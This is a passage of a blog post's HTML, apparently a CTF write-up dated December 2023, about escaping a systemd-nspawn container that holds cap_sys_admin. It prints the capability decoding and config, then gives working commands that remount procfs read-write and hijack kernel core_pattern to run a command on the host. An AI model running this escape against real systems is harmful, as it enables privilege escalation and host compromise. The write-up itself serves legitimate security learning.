+</span><span>  </span><span style="color:#bae67e;">&quot;SeccompProfile&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;NoNewPrivileges&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;HostnamePath&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hostname&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;HostsPath&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hosts&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;ShmPath&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;ResolvConfPath&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/resolv.conf&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;LocalLogCacheMeta&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>    </span><span style="color:#bae67e;">&quot;HaveNotifyEnabled&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false
+</span><span>  }
+</span><span>}
+</span></code></pre>
+<p>Following up on that shows that we have write access to root's .ssh directory, sshd is running on the host, and the host and docker container are networked together.  After fighting for a long time with the IO, I managed to get dropbear on inside the container and confirmed I could ssh up a level.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>&gt; cat /proc/self/status | grep CapEff
+</span><span>CapEff: 00000000fdecbfff
+</span><span>&gt; capsh --decode=00000000fdecbfff
+</span><span>0x00000000fdecbfff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_owner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap
+</span></code></pre>
+<p>Looking at the config shows we are explicitly allowed to invoke add_key, keyctl, or bpf syscalls inside the container.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>[Exec]
+</span><span>Boot=true
+</span><span>PrivateUsers=false
+</span><span>SystemCallFilter=add_key keyctl bpf
+</span><span>
+</span><span>[Network]
+</span><span>Zone=guests
+</span><span>Port=1337
+</span><span>
+</span><span>[Files]
+</span><span>Bind=/dev/fuse
+</span></code></pre>
+<p>I know the author well enough to know that the intended solution is bpf fuckery (with the bpf syscall and cap_sys_admin) but I don't know bpf well and didn't want to do that. Fortunately for me, cap_sys_admin is an unreasonably powerful capability and there are other routes.</p>
+<p>Systemd, by default, mounts procfs and sys as read-only. It does not prevent a user with the appropriate (and default) capabilities from mounting procfs again r/w. Once you have write access to procfs it's trivial to escalate privileges by modifying core_pattern.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>&gt; mkdir proc
+</span><span>&gt; mount -t proc proc proc
+</span><span>&gt; echo &#39;|/usr/bin/cp /flag.txt /var/lib/machines/ubuntu/flag.txt&#39; &gt; proc/sys/kernel/core_pattern
+</span><span>./crash
+</span><span>&gt; cat /flag.txt
+</span><span>potluck{sometimes-we-all-get-in-a-little-over-our-heads-dont-we}
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">28 December 2023</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/sandbox/">#sandbox</a></li>
+                    
+                    <li><a href="https://tsheinen.github.io/tags/docker/">#docker</a></li>
+                    
+                    <li><a href="https://tsheinen.github.io/tags/nspawn/">#nspawn</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
